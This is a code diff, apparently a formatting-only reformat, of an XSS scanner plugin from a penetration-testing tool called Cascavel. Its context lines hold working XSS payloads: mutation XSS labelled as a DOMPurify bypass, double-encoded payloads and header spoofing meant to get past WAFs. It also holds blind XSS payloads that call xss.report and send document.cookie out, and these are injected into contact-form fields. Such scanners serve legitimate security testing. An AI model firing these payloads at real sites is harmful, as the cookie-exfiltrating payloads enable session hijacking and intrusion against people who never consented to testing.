@@ -71,7 +71,10 @@ REFLECTED_PAYLOADS = [
     ("<form><input name=innerHTML><input name=innerHTML>", "DOM_CLOBBERING"),
     # Mutation XSS (DOMPurify bypass 2025)
     ('<noscript><p title="</noscript><img src=x onerror=alert(1)>">', "MUTATION_XSS"),
-    ("<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "MATH_MUTATION"),
+    (
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+        "MATH_MUTATION",
+    ),
     # Double encoding bypass
     ("%253Cscript%253Ealert(1)%253C/script%253E", "DOUBLE_ENCODE"),
     # SVG animate
@@ -115,7 +118,9 @@ BYPASS_HEADERS = [
     {"X-Forwarded-For": "127.0.0.1"},
     {"X-Originating-IP": "127.0.0.1"},
     {"X-Custom-IP-Authorization": "127.0.0.1"},
-    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
+    {
+        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+    },
 ]
 
 
@@ -152,7 +157,10 @@ def _test_reflected(target, param, is_waf_reflection):
         for headers in [{}] + BYPASS_HEADERS:
             try:
                 resp = requests.get(
-                    url, timeout=6, allow_redirects=True, headers={**{"User-Agent": "Cascavel/2.0"}, **headers}
+                    url,
+                    timeout=6,
+                    allow_redirects=True,
+                    headers={**{"User-Agent": "Cascavel/2.0"}, **headers},
                 )
                 if payload in resp.text:
                     return {
@@ -162,7 +170,11 @@ def _test_reflected(target, param, is_waf_reflection):
                         "payload": payload[:80],
                         "reflexao": True,
                         "status_http": resp.status_code,
-                        "severidade": "CRITICO" if "RCE" in method or "ESCAPE" in method else "ALTO",
+                        "severidade": (
+                            "CRITICO"
+                            if "RCE" in method or "ESCAPE" in method
+                            else "ALTO"
+                        ),
                         "bypass_header": list(headers.keys())[0] if headers else None,
                     }
             except Exception:
@@ -199,7 +211,9 @@ def _detect_dom_xss(target):
         body = resp.text
 
         # Buscar scripts inline e externos
-        scripts = re.findall(r"<script[^>]*>(.*?)</script>", body, re.DOTALL | re.IGNORECASE)
+        scripts = re.findall(
+            r"<script[^>]*>(.*?)</script>", body, re.DOTALL | re.IGNORECASE
+        )
         js_content = "\n".join(scripts) + "\n" + body
 
         for source in DOM_SOURCES:
@@ -240,7 +254,15 @@ def _detect_blind_xss_sinks(target):
         '"><script src=https://xss.report/c/cascavel></script>',
         '\'><img src=x onerror=this.src="https://xss.report/c/cascavel?c="+document.cookie>',
     ]
-    blind_params = ["name", "email", "comment", "feedback", "message", "subject", "body"]
+    blind_params = [
+        "name",
+        "email",
+        "comment",
+        "feedback",
+        "message",
+        "subject",
+        "body",
+    ]
     injected = []
     for param in blind_params:
         for payload in blind_payloads:
@@ -298,6 +320,13 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "xss_scanner",
         "versao": "2026.1",
-        "tecnicas": ["reflected", "dom_based", "blind", "mutation", "polyglot", "waf_bypass"],
+        "tecnicas": [
+            "reflected",
+            "dom_based",
+            "blind",
+            "mutation",
+            "polyglot",
+            "waf_bypass",
+        ],
         "resultados": vulns if vulns else "Nenhum XSS detectado",
     }
